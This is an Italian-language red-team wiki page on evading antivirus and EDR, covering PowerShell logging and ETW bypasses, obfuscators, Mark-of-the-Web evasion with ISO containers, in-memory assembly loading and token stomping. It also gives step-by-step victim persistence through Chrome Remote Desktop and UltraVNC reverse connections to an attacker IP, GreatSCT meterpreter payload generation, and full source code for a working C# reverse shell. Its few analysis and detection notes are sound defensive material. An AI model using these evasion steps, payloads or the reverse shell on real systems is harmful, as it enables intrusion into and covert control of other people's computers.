Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per scopi di audit e troubleshooting, ma può anche rappresentare un **problema per gli attaccanti che vogliono eludere il rilevamento**.

Per aggirare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare la trascrizione e il logging dei moduli di PowerShell**: puoi usare a questo scopo uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Usare PowerShell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato e potrai eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi farlo così: `powershell.exe -version 2`
- **Usare una sessione PowerShell unmanaged**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l'approccio usato da `powerpick` di Cobalt Strike). Questo elude i controlli legati specificamente al processo `powershell.exe`, ma non disabilita intrinsecamente AMSI, Script Block Logging o tutte le altre difese di PowerShell; la copertura dipende dal runtime e dall'implementazione dell'host.


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, che aumenta l'entropia del binario e rende più facile per AV ed EDR rilevarlo. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deoffuscare i binari .NET protetti da ConfuserEx

Quando si analizza un malware che usa ConfuserEx 2 (o fork commerciali), è comune imbattersi in diversi livelli di protezione che bloccano decompiler e sandbox. Il flusso di lavoro seguente **ripristina in modo affidabile un IL quasi originale**, che in seguito può essere decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Rimozione dell'anti-tampering – ConfuserEx cifra ogni *corpo del metodo* e lo decifra all'interno del costruttore statico del *modulo* (`<Module>.cctor`). Inoltre, applica una patch al checksum PE, per cui qualsiasi modifica causa il crash del binario. Usa **AntiTamperKiller** per individuare le tabelle dei metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   L’output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili per creare il tuo unpacker.

2.  Recupero dei simboli / del flusso di controllo: passa il file *pulito* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – seleziona il profilo ConfuserEx 2
     • de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi delle variabili originali e decrittograferà le stringhe costanti.

3.  Proxy-call stripping – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (ovvero *proxy call*) per rendere ancora più difficile la decompilazione. Rimuovili con **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario in dnSpy, cerca grandi blob Base64 o l’uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *payload* reale.  Spesso il malware lo memorizza come array di byte codificato in TLV, inizializzato all’interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza** dover eseguire il campione dannoso: utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo personalizzato chiamato `ConfusedByAttribute`, che può essere usato come IOC per classificare automaticamente i campioni.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di aumentare la sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione dalle manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator mostra come usare il linguaggio `C++11/14` per generare codice offuscato in fase di compilazione, senza usare strumenti esterni né modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate, generate dal framework di metaprogrammazione dei template C++, che renderà un po' più difficile la vita a chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un obfuscator per binari x64 in grado di offuscare diversi tipi di file PE, tra cui .exe, .dll e .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation granulare per i linguaggi supportati da LLVM, che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

### Mascheramento autonomo per funzione assistito dal compilatore LLVM

Invece di mascherare un intero implant solo mentre è inattivo, un backend LLVM X86 modificato può mantenere alcune funzioni mascherate con XOR ogni volta che sono inattive. La PoC Function Peekaboo seleziona i nomi demangled che contengono `REG_`, inserisce stub di entrata/uscita position-independent attorno al codice macchina finale e genera un unico handler di mascheramento condiviso in `.text`; le firme a livello sorgente e la calling convention Windows x64 rimangono invariate.<sup>[[38]](#references)[[39]](#references)</sup>

#### Trasformazione del flusso di controllo nel backend

Questa trasformazione va eseguita dopo la selezione delle istruzioni e l'ottimizzazione, perché deve includere **ogni return emesso** e conoscere l'esatto layout x86. Un `MachineFunctionPass` pre-emissione trova l'ultimo `MachineInstr::isReturn()`, lo elimina in modo che il percorso finale prosegua nell'epilogo aggiunto e sostituisce i return precedenti con `JMP_1 handler`. Mantieni qualsiasi teardown dello stack/frame generato dal compilatore prima di ciascun return; reindirizza solo l'istruzione di return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `emitFunctionBodyEnd()` emettono gli stub per funzione, mentre `emitEndOfAsmFile()` emette l'handler. I simboli condivisi tra le fasi di emissione consentono a un branch del prologo di puntare al suo epilogo, emesso successivamente; per un `je` near emesso manualmente, scrivi `0F 84` seguito dall'espressione MC di quattro byte `target - address_after_je`. Le call e i jump verso l'handler possono invece essere emessi come oggetti `MCInst` (`CALL64pcrel32` e `JMP_1`). Se non ha modificato nulla, un pass deve restituire `false` per una funzione non selezionata; in quel percorso la PoC restituisce erroneamente `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadati e inizializzazione pre-CRT

La PoC inserisce una chiave XOR e record da 16 byte contenenti un puntatore a funzione rilocato dal loader e una lunghezza a runtime in `.funcmeta`. Sebbene il campo C sia un `uint32_t`, l'handler accede a un QWORD all'offset `+8` del record, consumando la lunghezza e il relativo padding, e avanza tra i record di `0x10`. I nomi delle sezioni PE occupano solo otto byte, quindi la ricerca a runtime individua `.funcmet`. Una patcher esterna aggiunge una sezione eseguibile `.stub`, salva nello stub il vecchio RVA dell'entry point e reindirizza `AddressOfEntryPoint`; lo stub PIC ricava la image base da `gs:[0x60]` → `[PEB+0x10]`, scorre le import PE32+ per risolvere una `VirtualProtect` già importata e viene eseguito prima del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'inizializzazione imposta un sentinel in `gs:[0xE8]` e chiama ogni funzione nei metadati. Il prologo, sempre leggibile, registra l'inizio della funzione in `gs:[0xF0]`, rileva il sentinel e salta il body ancora in chiaro. L'epilogo usa quindi `call handler`; dopo che l'handler ha salvato 13 registri (`0x68` byte), l'indirizzo di ritorno in `[rsp+0x68]` corrisponde alla fine della funzione trasformata, quindi `end - start` può essere scritto nel record dei metadati. Lo stub azzera il sentinel e, dopo aver mascherato tutti i body, salta a `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una call normale, il prologo chiama lo stesso handler simmetrico per decodificare il body. Il percorso finale prosegue nell'epilogo aggiunto, mentre ogni return precedente salta direttamente all'handler condiviso. Anche l'epilogo normale usa `jmp handler` invece di `call`, così che, dopo aver rimesso la maschera, il `ret` dell'handler consumi l'indirizzo di ritorno del caller originale e preservi il risultato della funzione in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva di mascheramento e indicatori di analisi

L'handler individua il record corrente, salta il prologo visibile a lunghezza fissa (in questa build, `0x46` byte), imposta il resto su `PAGE_EXECUTE_READWRITE`, applica XOR byte per byte usando il byte meno significativo della chiave e poi imposta la protezione su `PAGE_EXECUTE_READ`. Lo stesso ciclo decodifica quindi all'ingresso e codifica a ogni normale uscita.<sup>[[38]](#references)[[39]](#references)</sup>

Gli indicatori ad alta affidabilità di questo design includono:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point dentro uno `.stub` eseguibile e una sezione `.funcmet` contenente una chiave e puntatori rilocati a `.text`;
- parsing pre-CRT di PEB, import table e section table, seguito da call tramite ciascun puntatore nei metadati;
- prologhi PIC `call`/`pop` identici e numerosi return reindirizzati a un unico handler;
- scritture in `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguite da transizioni ripetute di `VirtualProtect` e scritture XOR byte per byte in pagine eseguibili supportate dall'immagine.

Questa tecnica elude gli scanner di memoria, non offre protezione crittografica: il file patchato contiene ancora il body originale in chiaro e un debugger può impostare un breakpoint su `VirtualProtect` o sul ciclo XOR e scaricare la funzione attiva. Anche l'XOR a un solo byte, i metadati leggibili e il limite fisso `0x46` rendono semplice il recupero offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Gli slot TEB della PoC sono specifici per thread, ma le pagine di codice modificate sono condivise a livello di processo. L'accesso concorrente o ricorsivo può quindi riattivare le istruzioni mentre un'altra invocazione è in esecuzione; anche le eccezioni e le uscite non locali possono eludere il ripristino della maschera. Un'implementazione robusta deve sincronizzare le transizioni, ripristinare la protezione effettivamente restituita tramite `lpflOldProtect`, evitare lunghezze dello stub hard-coded, verificare l'allineamento dello stack x64 nei percorsi `call` e `jmp` e chiamare `FlushInstructionCache` dopo aver riscritto byte eseguibili. Microsoft attribuisce esplicitamente al caller la responsabilità della coerenza della cache delle istruzioni quando viene modificato codice eseguibile.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Potresti aver visto questa schermata scaricando ed eseguendo da internet alcuni eseguibili.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione: le applicazioni scaricate raramente attiveranno SmartScreen, che avviserà l'utente finale e ne impedirà l'esecuzione (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) denominato Zone.Identifier, creato automaticamente quando si scaricano file da internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica dello Zone.Identifier ADS di un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **attendibile** **non attivano SmartScreen**.

Un modo molto efficace per impedire ai payload di ricevere il Mark of The Web consiste nel inserirli in un contenitore come un ISO. Questo perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che inserisce i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO con [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging di Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

In modo simile a come si disabilita (bypassa) AMSI, è anche possibile far sì che la funzione **`EtwEventWrite`** del processo in user space restituisca immediatamente il controllo senza registrare eventi. Questo si ottiene patchando la funzione in memoria affinché ritorni subito, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Caricare binari C# in memoria è una tecnica nota da parecchio tempo ed è ancora un ottimo modo per eseguire i propri strumenti di post-exploitation senza farsi individuare dagli AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel **creare un nuovo processo sacrificabile**, iniettare il codice malevolo di post-exploitation in quel processo, eseguire il codice malevolo e, al termine, terminare il nuovo processo. Questo metodo presenta vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro implant Beacon. Ciò significa che, se qualcosa va storto durante l'azione di post-exploitation o veniamo individuati, ci sono **molte più probabilità** che il nostro **implant sopravviva**. Lo svantaggio è che ci sono **maggiori probabilità** di essere individuati dai **rilevamenti comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo, si evita di dover creare un nuovo processo e di farlo analizzare dagli AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, ci sono **molte più probabilità** di **perdere il beacon**, perché il processo potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il relativo BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare assembly C# **da PowerShell**: dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Riconfezionamento di strumenti .NET in WebAssembly con NativeAOT (WasmForge)

Le normali tecniche `execute-assembly` mantengono MSIL riconoscibile e finiscono per inizializzare un CLR. **WasmForge** cambia invece il substrato di esecuzione: migra un progetto C# al target WASI sperimentale NativeAOT-LLVM, lo compila in anticipo in WebAssembly e incorpora il modulo in un host Windows PE basato su Wazero. Il processo risultante non necessita del CLR, del JIT o dell'host `dotnet` del target; pertanto, le regole basate solo sui nomi degli assembly gestiti, sul caricamento del CLR, su AMSI o su .NET ETW perdono visibilità diretta. Questa è una tecnica di evasione e packaging, non un bypass dei confini di privilegio: il processo guest mantiene i permessi dello strumento originale e il comportamento OS osservabile.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilazione di un progetto C#

Il percorso di compilazione consigliato è l'ambiente Docker del progetto, che include .NET 10 SDK, il workload NativeAOT-LLVM, WASI SDK 24.0, il linker e le dipendenze per la firma. Un file `.csproj` viene rilevato automaticamente; la compilazione in un solo passaggio esegue la migrazione, l'applicazione delle patch di compatibilità, la compilazione WASM, la creazione del PE e la firma.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Per risolvere i problemi o rivedere il codice generato, suddividi il processo in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` e, infine, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. L’immagine di build usa anche un wrapper `wasm-component-ld` per evitare la codifica dei componenti WASI Preview 2 e produrre il modulo semplice previsto dal runtime incorporato.<sup>[[44]](#references)[[45]](#references)</sup>

### Bridging da wasm32 C# a x64 Win32

Non si tratta di una ricompilazione trasparente. NativeAOT-WASI non supporta o modifica funzionalità BCL orientate a Windows, e un guest wasm32 normalmente alloca slot per puntatori di quattro byte, mentre le API x64 possono restituire puntatori di otto byte. WasmForge affronta entrambi i problemi con i seguenti livelli generati:<sup>[[44]](#references)</sup>

1. Un patcher del codice sorgente corregge le differenze semantiche specifiche di AOT e reindirizza le chiamate non supportate a registro, pipe, WMI, identità, servizi di directory, versioni di file, LSA e funzioni simili verso helper `Wf*`.
2. Uno scanner P/Invoke genera mapping `DirectPInvoke` di NativeAOT, affinché le chiamate `[DllImport]` si colleghino ai simboli bridge C collegati, anziché caricare dinamicamente la DLL dichiarata all’interno del guest.
3. I puntatori destinati all’host usano `ulong` in C# e `uint64_t` in C. Un dispatcher generico inoltra la chiamata al gestore Win32 dell’host; un `out8_mask` contrassegna gli slot di output autentici da otto byte, le cui metà superiori devono essere mantenute. Per gli output non contrassegnati, con struttura wasm32, viene usata la protezione snapshot/restore, così una scrittura x64 non può corrompere i quattro byte adiacenti.
4. Bridge host dedicati gestiscono le operazioni non compatibili con il dispatch generico delle syscall, come l’accesso alla cache dei ticket LSA, le operazioni Kerberos/BCrypt con risultati strutturati, il traffico TCP KDC e le query LDAP.

Per esempio, un wrapper per `version.dll!VerQueryValueW` passa quattro indirizzi host e imposta i bit 2 e 3 (`0xC`), perché il puntatore al valore e la lunghezza sono slot di output da otto byte. Il wrapper resta generico e delega il nome della DLL, il nome dell’export, gli argomenti e la mask a `wf_call_v2`; l’host esegue la traduzione dei puntatori e richiama l’API nativa.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limiti e punti di rilevamento

Il codice che fa ampio uso della reflection, il caricamento dinamico di assembly, le callback native arbitrarie e le complesse strutture x64 restituite nella memoria WASM possono comunque richiedere patch specifiche per ogni tool o fallire del tutto. Anche i socket generici di WASI Preview 2 possono raggiungere stub no-op, quindi i tool supportati usano shim host specifici per protocollo. Convalida ogni comando rispetto a una build nativa, invece di presumere che le funzionalità siano equivalenti.<sup>[[44]](#references)[[45]](#references)</sup>

Questa tecnica sposta la telemetria, invece di rendere invisibile il payload. Il rilevamento può concentrarsi su un PE che contiene o materializza un modulo WASM, sul comportamento di un runtime simile a Wazero, su allocazioni e copie insolite di memoria host/guest, sull'invio generico diretto a Win32, su anomalie di firma e risorse PE, oltre che sulle chiamate API e sul traffico di rete risultanti. L'assenza di eventi CLR-load, AMSI o .NET ETW non dovrebbe quindi essere considerata una prova che un processo sia benigno.<sup>[[44]](#references)</sup>

## Utilizzo di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'Attacker**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB, è possibile **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repository indica che Defender continua a eseguire la scansione degli script, ma usando Go, Java, PHP ecc. abbiamo **maggiore flessibilità per eludere le firme statiche**. I test con script reverse shell casuali e non offuscati in questi linguaggi hanno avuto esito positivo.

## Re-hosting di WebAssembly per eludere l'analisi statica

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Il token stomping manipola il token di accesso di un prodotto di sicurezza come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli al contempo di eseguire azioni privilegiate di ispezione o correzione.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utilizzo di software attendibile

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop sul PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scaricalo da https://remotedesktop.google.com/, fai clic su "Set up via SSH" e poi sul file MSI per Windows per scaricarlo.
2. Esegui l'installer in modalità silenziosa sulla macchina della vittima (sono necessari i privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su Next. La procedura guidata ti chiederà quindi di autorizzare l'operazione; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare la GUI).
 

## Evasione avanzata

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

L'evasione è un argomento molto complesso; a volte bisogna tenere conto di molte fonti diverse di telemetria in un singolo sistema, quindi è praticamente impossibile restare completamente non rilevati in ambienti maturi.

Ogni ambiente in cui ti muoverai avrà punti di forza e debolezze specifici.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94) per acquisire familiarità con tecniche di evasione più avanzate.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'evasione in profondità.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche obsolete**

### **Verificare quali parti Defender rileva come malevole**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuove parti del binario** finché **non individua quale parte Defender** rileva come malevola, per poi indicartela.\
Un altro tool che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), che offre il servizio tramite un sito web pubblico all'indirizzo [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows 10, tutte le versioni di Windows includevano un **server Telnet** che potevi installare (come amministratore) eseguendo:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Fai in modo che si **avvii** all'avvio del sistema ed **eseguilo** ora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambiare la porta di telnet** (stealth) e disabilitare il firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (ti servono i download bin, non il setup)

**SULL’HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l’opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Quindi, sposta il binario _**winvnc.exe**_ e il file _**UltraVNC.ini**_ appena creato all’interno della **vittima**

#### **Connessione inversa**

L’**attaccante** deve **eseguire sul proprio** **host** il binario `vncviewer.exe -listen 5900`, così sarà **pronto** a ricevere una **connessione VNC** inversa. Quindi, sulla **vittima**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth, non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti attiverai un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare la guida, altrimenti attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

All'interno di GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload xml** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**L’attuale Defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima C# Revershell

Compilala con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Usalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# usando il compilatore

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:

```csharp
64bit:
